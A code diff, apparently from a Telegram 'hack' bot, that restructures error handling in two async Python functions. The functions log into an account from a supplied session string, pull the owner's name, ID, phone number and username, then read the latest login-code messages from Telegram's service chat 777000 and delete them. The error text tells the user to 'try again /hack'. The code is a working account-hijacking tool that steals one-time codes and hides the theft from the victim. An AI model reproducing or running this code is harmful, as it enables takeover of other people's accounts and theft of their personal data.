@@ -33,12 +33,12 @@ async def user_info(session):
         err += str(e)
                              
     if not err:    
-        async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
-            try:
+        try:
+            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 k = await stark.get_me()
                 msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)
-            except Exception as e:
-                err += str(e)
+        except Exception as e:
+            err += str(e)
                     
     if err:
         return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
@@ -59,14 +59,15 @@ async def get_otp(session):
         err += str(e)
                              
     if not err:    
-        async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
-            ok = []
-            async for message in stark.get_chat_history(777000,limit=2):
-                i += f"\n{message.text}\n"                                   
-                ok.append(message.id)                 
-            await stark.delete_messages(777000,ok)
-    except Exception as e:
-        err += str(e)
+        try:
+            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+                ok = []
+                async for message in stark.get_chat_history(777000,limit=2):
+                    i += f"\n{message.text}\n"                                   
+                    ok.append(message.id)                 
+                await stark.delete_messages(777000,ok)
+        except Exception as e:
+            err += str(e)
                     
     if err:
         return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
